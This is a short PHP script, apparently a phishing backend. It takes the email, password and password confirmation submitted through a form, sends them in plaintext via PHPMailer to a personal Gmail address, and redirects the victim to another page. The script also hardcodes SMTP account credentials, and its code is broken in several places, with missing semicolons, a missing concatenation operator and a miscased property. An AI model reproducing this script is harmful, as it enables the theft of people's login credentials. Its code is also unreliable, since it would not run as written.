<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

require_once('phpmailer/PHPMailerAutoLoad.php');
$mail = new PHPMailer;
$mail->CharSet = 'utf-8';
$email = $_POST['email'];
$password = $_POST['password'];
$password2 = $_POST['password2'];


$mail->isSMTP();
$mail->Host = 'sandbox.smtp.mailtrap.io';
$mail->SMTPAuth = true;
$mail->UserName = 'f57a14450f5056';
$mail->Password = 'ae1081c260925b';
$mail->SMTPSecure = 'ssl';
$mail->Port = 2525;

$mail->setFrom('sandbox.smtp.mailtrap.io');
$mail->addAddress('dimdimih356@gmail.com');

$mail->isHTML(true);

$mail->Subject = 'Данные';
$mail->Body    = '' .$email . ' Почта ' .$password. ' <br>Пароль' .$password2 ' Подтверждение пароля ';
$mail->AltBody = '';

if(!$mail->send()) {
    echo 'Error'
} else {
    header('location: index1.html')
}